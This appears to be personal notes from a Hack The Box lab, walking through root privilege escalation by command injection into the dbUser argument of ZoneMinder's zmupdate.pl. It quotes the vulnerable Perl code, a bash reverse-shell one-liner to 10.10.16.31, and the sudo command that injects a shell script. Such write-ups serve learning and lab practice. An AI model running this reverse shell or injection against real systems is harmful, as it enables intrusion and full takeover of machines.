
doing sudo -l
![[Pasted image 20231218024658.png]]

okay after reading on htb forums there seems to be command injection in zmupdate.pl
the only relevant issue regarding this was here
https://github.com/ZoneMinder/zoneminder/issues/2951
## zmupdte.pl analysis
my best bet is the command injection lies in the following code snippet
```perl
--SNIPPED--
if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser; //COMMAND INJECTION
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
--SNIPPED--
```
looking at the issue, they talked about interpreting password as a variable 
![[Pasted image 20231221022243.png]]
we try the same thing in `dbUser` by doing `'$(whoami)'` 

further down in `zmupdate.pl` it actually passes the `command` to the command line
```perl
--SNIPPED--
 print("Executing '$command'\n") if logDebugging();
      my $output = qx($command); //qx is function to execute system commands
      my $status = $? >> 8;
--SNIPPED--
```

## Command injection

create revshell in /dev./shm, zoneminder doesnt have write permission in /tmp idk why

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.31/9998 0>&1'
```
trigger the exploit

![[Pasted image 20231219023411.png]]
we get db already latest version, lets try giving it `version` argument 

```bash
sudo /usr/bin/zmupdate.pl -v=1 -u='$(/dev/shm/afsec.sh)' -p=ZoneMinderPassword2023
```

get the shell

![[Pasted image 20231219023336.png]]

and we get root!
